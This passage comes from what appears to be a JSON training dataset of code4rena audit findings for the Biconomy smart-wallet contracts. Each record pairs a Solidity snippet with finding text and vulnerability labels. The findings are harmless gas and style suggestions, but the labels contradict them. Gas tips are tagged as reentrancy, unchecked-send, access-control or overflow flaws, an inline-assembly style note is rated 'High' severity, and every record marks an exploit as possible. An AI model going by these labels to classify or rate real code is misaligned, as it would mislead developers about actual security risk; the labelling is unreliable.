    "code": "\nFile: contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n36: require(address(_entryPoint) != address(0), \"VerifyingPaymaster: Entrypoint can not be zero address\");\n37: require(_verifyingSigner != address(0), \"VerifyingPaymaster: signer of paymaster can not be zero address\");\n42: revert(\"Deposit must be for a paymasterId. Use depositFor\");\n49:\u00a0require(!Address.isContract(paymasterId), \"Paymaster Id can not be smart contract address\");\n50: require(paymasterId != address(0), \"Paymaster Id can not be zero address\");\n66: require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\n107: require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\n108:\u00a0require(verifyingSigner == hash.toEthSignedMessageHash().recover(paymasterData.signature), \"VerifyingPaymaster: wrong signature\");\n109: require(requiredPreFund <= paymasterIdBalances[paymasterData.paymasterId], \"Insufficient balance for paymaster id\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "G-06 Require() or revert() strings longer than 32 bytes cost extra gas",
    "description": "Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc. Each extra memory word of bytes past the original 32\u00a0[incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings)\u00a0which costs\u00a0**3 gas** I suggest shortening the revert strings to fit in 32 bytes, or using custom errors. _There are 14 instances of this issue_",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/base/ModuleManager.sol\n\n34: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n49: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "G-07 Duplicated require() or revert() checks should be refactored to a modifier or function",
    "description": "_There are 2 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol File: contracts/smart-contract-wallet/base/ModuleManager.sol 34: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\"); 49: require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.213,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/libs/Math.sol\n\n36: return (a & b) + (a ^ b) / 2;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "G-08 Multiplication or division by 2 should use bit shifting",
    "description": "`<x> * 2`\u00a0is equivalent to\u00a0`<x> << 1`\u00a0and\u00a0`<x> / 2`\u00a0is the same as\u00a0`<x> >> 1`. The\u00a0`MUL`\u00a0and\u00a0`DIV`\u00a0opcodes cost 5 gas, whereas\u00a0`SHL`\u00a0and\u00a0`SHR`\u00a0only cost 3 gas. While the compiler uses the\u00a0`SHR`\u00a0opcode to accomplish both, the version that uses division incurs an overhead of\u00a0[**20 gas**](https://gist.github.com/IllIllI000/ec0e4e6c4f52a6bca158f137a3afd4ff)\u00a0due to\u00a0`JUMP`s to and from a compiler utility function that introduces checks which can be avoided by using\u00a0`unchecked {}`\u00a0around the division by two. _There is 1 instance of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol File: contracts/smart-contract-wallet/libs/Math.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.088,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "assembly{ id := chainid() }\n => uint256 id = block.chainid",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "[N-05]  NON-ASSEMBLY METHOD AVAILABLE",
    "description": "There are some automated tools that will flag a project as having higher complexity if there is inline-assembly, so it\u2019s best to avoid using it where it\u2019s not necessary 144: **scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol** `assembly{ id := chainid() } => uint256 id = block.chainid`",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.058,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-02] DUPLICATED REQUIRE()/REVERT() CHECKS SHOULD BE REFACTORED TO A MODIFIER OR FUNCTION",
    "description": "**scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol** 34,49:  `require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.07,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nLine 449:    function transfer(address payable dest, uint amount) external payable nonReentrant onlyOwner {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "1. Save gas with `payable` functions",
    "description": "Marking functions as `payable` will be cheaper (by ~20 gas) than using non-`payable` functions because the Solidity compiler inserts a check into non-`payable` functions that requires `msg.value` to be zero. For instance, the code at [SmartAccount.sol#L449](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L449) can be refactored as: Line 449:    function transfer(address payable dest, uint amount) external payable nonReentrant onlyOwner { > **Note**: Although this optimization can save gas, it is important to be aware of the security considerations involving Ether held in contracts that it introduces. > More information on this topic can be found in the [Solidity Compiler Discussion](https://github.com/ethereum/solidity/issues/12539).",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.117,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/SmartAccount.sol\nunchecked {\n    nonces[batchId]++;\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "6. Uncheck arithmetics operations that can\u2019t underflow/overflow",
    "description": "Solidity version 0.8+ has an implicit overflow and underflow check on unsigned integers. When an overflow or an underflow isn\u2019t possible, some gas can be saved using an unchecked block. For example, the code at [SmartAccount.sol#L216](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L216) can be refactored to as: File: contracts/smart-contract-wallet/SmartAccount.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.101,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nLine 171:    MemoryUserOp storage mUserOp = opInfo.mUserOp;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "7.  Using `Storage` Instead of `Memory` for Structs/Arrays Saves Gas",
    "description": "When fetching data from a `storage` location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from `storage`, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new `memory` variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declaring the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incurring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct. As an example, The code at [EntryPoint.sol#L171](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L171) can be refactored as follows: Line 171:    MemoryUserOp storage mUserOp = opInfo.mUserOp; Affected line of code:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.069,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::234 => uint256 payment = 0;\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::310 => uint256 i = 0;\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::74 => for (uint256 i = 0; i < opslen; i++) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::78 => uint256 collected = 0;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::80 => for (uint256 i = 0; i < opslen; i++) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::99 => uint256 totalOps = 0;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::100 => for (uint256 i = 0; i < opasLen; i++) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::106 => uint256 opIndex = 0;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::107 => for (uint256 a = 0; a < opasLen; a++) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::112 => for (uint256 i = 0; i < opslen; i++) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::126 => uint256 collected = 0;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::128 => for (uint256 a = 0; a < opasLen; a++) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::134 => for (uint256 i = 0; i < opslen; i++) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::313 => uint256 missingAccountFunds = 0;\nscw-contracts\\contracts\\smart-contract-wallet\\base\\ModuleManager.sol::119 => uint256 moduleCount = 0;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::234 => uint256 payment = 0; scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::310 => uint256 i = 0; scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::74 => for (uint256 i = 0; i < opslen; i++) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::78 => uint256 collected = 0;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::64 => if (userOp.initCode.length == 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::324 => // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::325 => require(uint256(s) + 32 <= signatures.length, \"BSA022\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::327 => // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::333 => require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::467 => require(dest.length == func.length, \"wrong array lengths\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::70 => uint256 opslen = ops.length;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::98 => uint256 opasLen = opsPerAggregator.length;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::101 => totalOps += opsPerAggregator[i].userOps.length;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::111 => uint256 opslen = ops.length;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::132 => uint256 opslen = ops.length;\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::174 => if (callData.length > 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::178 => if (result.length > 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::212 => if (paymasterAndData.length > 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::213 => require(paymasterAndData.length >= 20, \"AA93 invalid paymasterAndData\");\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::237 => address factory = initCode.length >= 20 ? address(bytes20(initCode[0 : 20])) : address(0);\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::262 => if (initCode.length != 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::264 => if (sender.code.length != 0) revert FailedOp(opIndex, address(0), \"AA10 sender already constructed\");\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::268 => if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), \"AA15 initCode must create sender\");\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::299 => if (sender.code.length == 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::303 => if (mUserOp.paymaster != address(0) && mUserOp.paymaster.code.length == 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::452 => if (context.length > 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSend.sol::21 => ///                     data length as a uint256 (=> 32 bytes),\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSend.sol::30 => let length := mload(transactions)\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSend.sol::34 => } lt(i, length) {\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSend.sol::48 => // We offset the load address by 85 byte (operation byte + 20 address bytes + 32 value bytes + 32 data length bytes)\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSend.sol::61 => // Next entry starts at 85 byte + data length\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSendCallOnly.sol::14 => ///                     data length as a uint256 (=> 32 bytes),\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSendCallOnly.sol::24 => let length := mload(transactions)\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSendCallOnly.sol::28 => } lt(i, length) {\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSendCallOnly.sol::42 => // We offset the load address by 85 byte (operation byte + 20 address bytes + 32 value bytes + 32 data length bytes)\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSendCallOnly.sol::56 => // Next entry starts at 85 byte + data length\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::37 => return PaymasterData(paymasterId, signature, signature.length);\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::107 => require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::64 => if (userOp.initCode.length == 0) { scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4] scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8; scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::324 => // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 40,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::236 => if (refundInfo.gasPrice > 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::174 => if (callData.length > 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::178 => if (result.length > 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::212 => if (paymasterAndData.length > 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::452 => if (context.length > 0) {\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::61 => require(_unstakeDelaySec > 0, \"must specify unstake delay\");\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::64 => require(stake > 0, \"no stake specified\");\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::99 => require(stake > 0, \"No stake to withdraw\");\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\StakeManager.sol::100 => require(info.withdrawTime > 0, \"must call unlockStake() first\");\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::236 => if (refundInfo.gasPrice > 0) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::174 => if (callData.length > 0) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::178 => if (result.length > 0) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::212 => if (paymasterAndData.length > 0) { scw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::452 => if (context.length > 0) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */\nscw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::39 => // keccak256(\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::45 => // keccak256(\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::217 => txHash = keccak256(txHashData);\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::347 => _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::416 => return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::430 => keccak256(\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::435 => keccak256(_tx.data),\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::34 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::70 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::71 => bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(code)));\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::197 => return keccak256(abi.encode(userOp.hash(), address(this), block.chainid));\nscw-contracts\\contracts\\smart-contract-wallet\\base\\FallbackManager.sol::11 => // keccak256(\"fallback_manager.handler.address\")\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::80 => return keccak256(abi.encode(\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::83 => keccak256(userOp.initCode),\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::84 => keccak256(userOp.callData),\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "scw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */ scw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::39 => // keccak256( scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::45 => // keccak256( scw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::8 => import \"@account-abstraction/contracts/interfaces/IAccount.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\BaseSmartAccount.sol::9 => import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */\nscw-contracts\\contracts\\smart-contract-wallet\\Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::6 => import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::7 => import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::13 => import \"./common/SecuredTokenTransfer.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::14 => import \"./interfaces/ISignatureValidator.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::16 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::40 => //     \"EIP712Domain(uint256 chainId,address verifyingContract)\"\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::46 => //     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::77 => require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::110 => require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccount.sol::128 => require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\nscw-contracts\\contracts\\smart-contract-wallet\\SmartAccountFactory.sol::18 => require(_baseImpl != address(0), \"base wallet address can not be zero\");\nscw-contracts\\contracts\\smart-contract-wallet\\aa-4337\\core\\EntryPoint.sol::15 => import \"../interfaces/IAggregatedAccount.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::4 => import \"../interfaces/ERC1155TokenReceiver.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::5 => import \"../interfaces/ERC721TokenReceiver.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\handler\\DefaultCallbackHandler.sol::6 => import \"../interfaces/ERC777TokensRecipient.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\libs\\MultiSend.sol::27 => require(address(this) != multisendSingleton, \"MultiSend should only be called via delegatecall\");\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::4 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\PaymasterHelpers.sol::5 => import \"@account-abstraction/contracts/interfaces/UserOperation.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::6 => import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::7 => import \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\nscw-contracts\\contracts\\smart-contract-wallet\\paymasters\\verifying\\singleton\\VerifyingSingletonPaymaster.sol::8 => import 